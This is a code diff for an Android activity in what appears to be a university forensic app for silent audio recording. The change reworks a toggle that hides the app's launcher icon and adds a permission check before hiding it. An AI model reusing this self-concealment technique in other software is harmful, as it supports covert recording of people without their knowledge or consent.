@@ -2,8 +2,10 @@ package com.forensic.unipg.silenceaudiorecording;
 
 import android.Manifest;
 import android.app.ActivityManager;
+import android.app.AlertDialog;
 import android.content.ComponentName;
 import android.content.Context;
+import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.support.v4.app.ActivityCompat;
@@ -41,7 +43,6 @@ public class SilenceAudioRecordingActivity extends AppCompatActivity {
     CheckBox  cb_read_phone_state  = null;
     CheckBox  cb_hide_app_icon     = null;
     Button    bt_service           = null;
-
 
     protected void onCreate(Bundle savedInstanceState)
     {
@@ -109,10 +110,42 @@ public class SilenceAudioRecordingActivity extends AppCompatActivity {
         cb_hide_app_icon = (CheckBox)findViewById(R.id.cb_hide_icon);
         cb_hide_app_icon.setChecked(!isLauncherIconVisible());
         //attach listener
-        cb_hide_app_icon.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
+        cb_hide_app_icon.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener()
+        {
             @Override
-            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
-                setAppIconVisibility();
+            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked)
+            {
+                if(cb_hide_app_icon.isChecked()){
+                    if(acceptREAD_PHONE_STATE) {
+                        getPackageManager().setComponentEnabledSetting(LAUNCHER_COMPONENT_NAME,
+                                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                                PackageManager.DONT_KILL_APP);
+                        Log.d("forensic", "hiding");
+                    }
+                    else
+                    {
+                        AlertDialog.Builder alert = new AlertDialog.Builder(SilenceAudioRecordingActivity.this);
+                        alert.setTitle("Error");
+                        alert.setMessage("Grant phone permission  before hiding the icon!");
+                        alert.setPositiveButton("OK", new DialogInterface.OnClickListener() {
+                            public void onClick(DialogInterface dialog, int id) {
+                            }
+                        });
+                        AlertDialog dialog = alert.create();
+                        dialog.show();
+                        cb_hide_app_icon.setOnCheckedChangeListener(null);
+                        cb_hide_app_icon.setChecked(false);
+                        cb_hide_app_icon.setOnCheckedChangeListener(this);
+
+                    }
+
+                }
+                else{
+                    getPackageManager().setComponentEnabledSetting(LAUNCHER_COMPONENT_NAME,
+                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                            PackageManager.DONT_KILL_APP);
+                    Log.d("forensic","showing");
+                }
             }
         });
         //show
@@ -120,7 +153,7 @@ public class SilenceAudioRecordingActivity extends AppCompatActivity {
         //text edit
         et_host = (EditText)findViewById(R.id.et_host);
         et_port = (EditText)findViewById(R.id.et_port);
-        //applay info
+        //apply info
         et_host.setText(mInfo.mHost);
         et_port.setText(Integer.toString(mInfo.mPort));
         //edit text
@@ -218,23 +251,6 @@ public class SilenceAudioRecordingActivity extends AppCompatActivity {
     public void requestReadPhoneStateRuntimePermission()
     {
         ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, REQUEST_RECORD_AUDIO);
-    }
-    public void setAppIconVisibility()
-    {
-        if(cb_hide_app_icon.isChecked()){
-            getPackageManager().setComponentEnabledSetting(LAUNCHER_COMPONENT_NAME,
-                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    PackageManager.DONT_KILL_APP);
-                    Log.d("forensic","hiding");
-        }
-        else{
-            getPackageManager().setComponentEnabledSetting(LAUNCHER_COMPONENT_NAME,
-                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                    PackageManager.DONT_KILL_APP);
-                    Log.d("forensic","showing");
-        }
-
-
     }
 
     private boolean isServiceRunning(Class<?> serviceClass)
